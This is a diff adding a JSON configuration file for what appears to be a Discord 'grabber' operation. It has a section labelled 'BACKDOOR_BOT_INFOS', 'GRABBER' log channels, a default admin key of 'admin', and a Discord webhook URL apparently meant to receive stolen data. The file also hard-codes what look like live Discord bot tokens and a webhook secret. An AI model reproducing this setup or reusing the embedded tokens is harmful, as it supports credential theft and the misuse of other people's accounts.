@@ -1,0 +1,56 @@
+{
+    "API": {
+        "PORT": 1337,
+        "BASE": "/api",
+        "LINK": "http://xxx.xxx.xxx.xxx",
+
+        "OWNER_TOKEN": "",
+
+        "ADMIN_KEYS": [
+            "admin"
+        ] 
+    },
+
+    "BACKDOOR_BOT_INFOS": {
+        "BOT_TOKEN": "OTEyMTI5MjY3MjAxMDkzNzAz.YZrckw.uGPUxVR2_DntxzAeYvhLDyiOMIE",
+        "PREFIX": ".",
+        "OWNERS": []
+    },
+
+    "BOT": {
+        "TOKEN": "OTA4ODE2MTQ0ODkzMzc4NjIx.YY7O_Q.GIrOMbTt7i-NZzthfKxp4M0Y1Eg",
+        "PREFIX": "vanis",
+
+        "CHANNELS": {
+
+            "GRABBER": [
+                "000000000000000000",
+                "000000000000000000"
+            ],
+                     
+            "LOGS": "000000000000000000"
+        },
+
+        "PERMS": {
+
+            "OWNER": [
+                "000000000000000000",
+                "000000000000000000"
+            ],
+
+            "ADMIN": [
+                "xxx"
+            ],
+
+            "MODO": [
+                "xxx"
+            ]
+        },
+
+        "MESSAGE_TO_EDIT": {
+            "STAT_ID": ""
+        }
+    },
+    
+    "HOOK": "https://discord.com/api/webhooks/927089067122884628/rLTLN8vU8Poo7h9M8P_HkiOgnbxC2JfxNOGPqIZQWwOT6vjaLy26QMYkl4eIgtE-wmlh"
+}
